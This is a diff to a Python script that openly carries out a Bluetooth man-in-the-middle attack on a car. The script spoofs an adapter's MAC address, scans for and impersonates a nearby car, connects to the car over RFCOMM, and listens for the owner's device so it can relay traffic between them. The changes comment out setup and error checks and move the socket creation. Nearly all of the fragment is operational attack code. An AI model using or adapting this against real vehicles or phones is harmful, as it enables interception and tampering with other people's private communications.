@@ -44,14 +44,10 @@ def during_takeover():
 print("Bluetooth Man In The Middle Attack!")
 
 # Identify which bluetooth adapter can change it's mac address
-subprocess.Popen(['service', 'bluetooth', 'start'], stdout=subprocess.PIPE)
-subprocess.Popen(['hciconfig', 'hci0', 'up'], stdout=subprocess.PIPE)
-proc = subprocess.Popen(['hciconfig', 'hci1', 'up'], stdout=subprocess.PIPE)
-time.sleep(1)
-
+#subprocess.Popen(['service', 'bluetooth', 'start'], stdout=subprocess.PIPE)
+#subprocess.Popen(['hciconfig', 'hci0', 'up'], stdout=subprocess.PIPE)
 adapter = raw_input("Which bluetooth adapter is spoofed? ")
 subprocess.Popen(['hciconfig', adapter, 'down'], stdout=subprocess.PIPE)
-time.sleep(1)
 
 # Scan for discoverable bluetooth devices
 nearby_devices = {}
@@ -66,19 +62,14 @@ for name, addr in nearby_devices:
 # Select what device we want to spoof
 device = input("\nWhat device do you want to spoof (car)? ")
 (car_mac, car_name) = nearby_devices[device-1]
+print("You selected: %s" % car_mac)
 
 # deactivate spoofed adapter until we manage to pair with the car
-time.sleep(2)
 
 # Pair to the car
 
 # Socket for communication with the car (client)
 car_socket=BluetoothSocket( RFCOMM )
-
-# Socket to listen for user connection (server)
-subprocess.Popen(['hciconfig', adapter, 'up'], stdout=subprocess.PIPE)
-time.sleep(2)
-user_socket=BluetoothSocket( RFCOMM )
 
 # Attempt to connect to the car on port 1
 option = 'y'
@@ -92,15 +83,17 @@ while option == 'y' or option == 'Y':
         continue
 
 # If we didn't manage to connect to the car - exit
-if option != 'y' and option != 'Y':
-    print("Could not establish communication with the specified device, exiting")
-    exit()
+#if option != 'y' and option != 'Y':
+#    print("Could not establish communication with the specified device, exiting")
+#    exit()
 
 # Once we connected to the car - enable spoofed adapter, 
 # so the next device trying to connect to spoofed 
 # MAC address will connect to us
 proc = subprocess.Popen(['hciconfig', adapter, 'up'], stdout=subprocess.PIPE)
 
+# Socket to listen for user connection (server)
+user_socket=BluetoothSocket( RFCOMM )
 # Listen for incoming connection from the user on port 1
 user_socket.bind(("", 1 ))
 user_socket.listen(1)
